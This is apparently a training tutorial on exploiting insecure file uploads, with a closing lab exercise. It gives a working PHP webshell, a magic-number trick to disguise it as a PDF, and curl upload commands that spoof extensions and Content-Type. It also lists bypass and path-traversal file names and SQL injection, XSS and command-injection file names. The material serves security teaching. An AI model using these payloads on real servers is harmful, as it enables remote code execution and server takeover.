# Finding and exploiting file upload vulnerabilities

## General methodology for identifying insecure file uploads

1. Locate the file upload capability in the application, confirming that the required permissions for uploading files are present.
1. Attempt to discover where the files are stored and if they can be accessed after being uploaded.
1. Attempt to upload an unexpected file circumventing file extension validations.
1. Attempt to upload an unexpected file by setting a custom value for the `Content-Type` header.
1. Attempt to upload an unexpected file by manipulating the magic number.
1. Attempt to find a method to rename an uploaded file in order to change its extension.
1. Attempt to upload an unexpected file with a crafted file name to leverage path traversal, SQL injection, XSS, or command injection vulnerabilities.
1. Attempt to upload server configuration files.
1. Attempt to cause information disclosure to reveal any sensitive data that may lead to alternative attack vectors.
1. Attempt to upload an executable file that will run malicious code when accidentally opened by a victim.

## Exploiting insecure file uploads

### Bypassing file extensions checks

* Using uppercase letters (e.g., `.pHp`, `.pHP5` or `.ASP`).
* Adding a valid extension before the execution extension (e.g., `image.png.php` or `image.png.php5`).
* Adding special characters at the end (e.g., `file.php%20`, `file.php%0d%0a` or `file.php/`).
* Tricking the server-side extension parser by using techniques such as inserting junk data (null bytes) between extensions (e.g., `image.php%00.png` or `image.php\x00.png`).
* Adding another layer of extensions (e.g., `image.png.jpg.php` or `image.php%00.png%00.jpg`).
* Puting the execution extension before the valid extension, which can be useful in case of server misconfigurations (e.g., `image.php.png`).
* Using NTFS `Alternate Data Stream (ADS)` in Windows inserting a colon character `:` after a forbidden extension and before a permitted one (e.g., `image.asp:.jpg`).

#### Sending a file with a double extension using `curl`

* The following `curl` command can be used to send a malicious `php` file with a double extension to the `/upload` endpoint:

  ```bash
  curl -F "file=@malicious.php;filename=image.png.php" https://domain.tbl/upload
  ```
  
  * `file` is the parameter where the server expects the file itself.
  * `@malicious.php` is the local file with harmful code.

### Bypassing `Content-Type` header checks

* Malicious users can manipulate the `Content-Type` header in HTTP requests to bypass validation that relies on this header to determine the file type.
* The `Content-Type` header in an upload HTTP request can be modified to represent a any file type allowed by the application, regardless of whether the file is harmful (e.g., setting `image/jpeg` for an executable script).

#### Tampering the `Content-Type` header using `curl`

* The following `curl` command can be used to send a malicious PHP file while spoofing the `Content-Type` header to appear as a `jpeg` file:

  ```bash
  curl -F "file=@malicious.php;type=image/jpeg" https://domain.tbl/upload
  ```

### Bypassing magic number checks

* The magic number is a unique sequence of bytes located at the beginning of a file's content that is used to identify the file type, according to a [list of file signatures][1]. These bytes serve as a signature for the file, allowing the operating system or applications to determine its type, even without relying on the file extension:
  * `jpeg (jpg)` files start with `FF D8 FF` (corresponding to `ÿØÿÛ`).
  * `png` files start with `89 50 4E 47 0D 0A 1A 0A` (corresponding to `‰PNG␍␊␚␊`).
  * `pdf` files start with `25 50 44 46 2D` (corresponding to `%PDF-`).
  * `zip` files start with `50 4B 03 04` (corresponding to `PK␃␄`).
* Malicious users can easily prepend a valid magic number to malicious files, making them seem legitimate. For instance, adding the `%PDF-2.0` signature at the start of a webshell file can trick the system into thinking it's a PDF file.
  > :older_man: `webshell` is the common name given to a script used by attackers that, when uploaded to a web server, allows them to execute system commands and take control of the server as if they had direct shell access, but all remotely via the web.
* The following command execution is a demonstrative example of how it can be performed.
  1. Start by showing the content of the `webshell.php` file:

      ```bash
      :~$ cat webshell.php 
      <?php system($_GET["cmd"]); ?>
      ```

  1. Then, determine the file type by using the `file` system command:

      ```bash
      :~$ file webshell.php
      webshell.php: PHP script text, ASCII text
      ```

  1. Proceed to add the appropriate magic number for a PDF file (i.e., `%PDF-2.0`) at the beginning of the file:

      ```bash
      :~$ echo "%PDF-2.0$(cat webshell.php)" > webshell.php
      ```

  1. Display the content of the `webshell.php` file once more to verify the change:

      ```bash
      :~$ cat webshell.php
      %PDF-2.0<?php system($_GET["cmd"]); ?>
      ```

  1. Show the hex dump of the file to check the initial bytes, ensuring they correspond to `25 50 44 46 2D` as stated in the [list of file signatures][1]:

      ```bash
      :~$ xxd webshell.php 
      00000000: 2550 4446 2d32 2e30 3c3f 7068 7020 7379  %PDF-2.0<?php sy
      00000010: 7374 656d 2824 5f47 4554 5b22 636d 6422  stem($_GET["cmd"
      00000020: 5d29 3b20 3f3e 0a                        ]); ?>.
      ```
  
  1. Determine the file type again using the `file` command, and notice it has changed to PDF:

      ```bash
      :~$ file webshell.php
      webshell.php: PDF document, version 2.0
      ```

### Using crafted file names to bypass checks or exploit existing vulnerabilities

* File name limits can be exploited by using long file names to truncate safe extensions. For instance, in Linux, where the maximum file name length is 255 bytes, a name like `aaaa.php.png` (with `aaaa` being a long string) could potentially bypass checks in specific situations.
* File names can also be used to exploit vulnerabilities related to how the application processes and handles the file name. For example, a file name like `sleep(20)-- -.jpg` could trigger a SQL injection, `<svg onload=alert("XSS")>` might lead to XSS, and `; sleep 20;` might result in command injection.

#### Exploiting path traversal vulnerabilities

* Path traversal is the process of manipulating file paths to access unintended locations outside the designated directory.
* Malicious users include sequences like `../` in file names to traverse directories and store files in unintended locations. For instance, a file name such as `../../../../var/www/html/index.php` would place the file in the web root, potentially replacing the actual main content of the web application, which could then be accessed and executed via URL.

### Uploading server configuration files

* Depending on the web server hosting the application, a malicious user could upload configuration files such as `.htaccess` for Apache or `web.config` for IIS, potentially altering server behavior.

### Gathering sensitive information

* Discovering the upload folder or storage location and gaining access to all files, retrieving all the data stored.
* Uploading a file with a file name matching an already existing file or folder.
* Uploading the same file multiple times simultaneously and with the exact file name.
* Uploading a file in Windows with a file name containing invalid characters such as `|`, `<`, `>`, `*`, `?` or `"`.
* Uploading a file in Windows using reserved names such as `AUX`, `COM1`, `COM2`, `COM3`, `COM4`, `COM5`, `COM6`, `COM7`, `COM8`, `COM9`, `CON`, `LPT1`, `LPT2`, `LPT3`, `LPT4`, `LPT5`, `LPT6`, `LPT7`, `LPT8`, `LPT9`, `NUL`, or `PRN`.

### Causing Denial of Service (DoS)

* If a web application does not limit file sizes, a malicious user can upload large files, leading to resource exhaustion.
* A similar behavior can be achieved by uploading or downloading multiple files without any rate limiting in place.

## Exercise to practice :writing_hand:

* The following file upload form is vulnerable to `Remote Code Execution (RCE)`, meaning it's possible to upload a file that can be used to execute arbitrary code on the server.
* When accessing the code editor via the `Open Code Editor` button, a command line is available along with a file named `webshell.php`, located in `/home/coder/app/webshell.php`, that could allow arbitrary code execution on the server if it gets uploaded.
* The goal here is to ***use the command line provided in the code editor** to upload, using `curl`, the `webshell.php` file via an HTTP POST request to the `/upload` endpoint:

  ```bash
  curl -F "file=@webshell.php" $APP_URL/upload
  ```

* However, there is a weak security measure in place that restricts file uploads to `.jpg`, `.jpeg`, and `.png` extensions, as shown below, which needs to be bypassed to upload the `webshell.php` file:

  ```bash
  coder@localhost:~/app$ curl -F "file=@webshell.php" $APP_URL/upload
  { "message" : "File type not allowed" }
  ```

* Only after circumventing this security measure by one of the techniques shown above and successfully uploading the file to the server, which is your job, it's time then to use the `webshell.php` file to arbitrarily execute the `validate` command in order to complete the exercise:

  ```bash
  curl $APP_URL/uploads/<webshell_file>?cmd=validate
  ```

  * Besides `validate`, it will be possible to execute any supported command such as `whoami`, `ls` or `pwd` just like in a regular terminal.
  * Note that `/upload` is the endpoint for uploading files, while `/uploads/` is the directory where the uploaded files are stored.
* Will you be able to bypass the security measure and run the `validate` command through the `webshell.php` file to complete the exercise?
  @@ExerciseBox@@

[1]: https://en.wikipedia.org/wiki/List_of_file_signatures
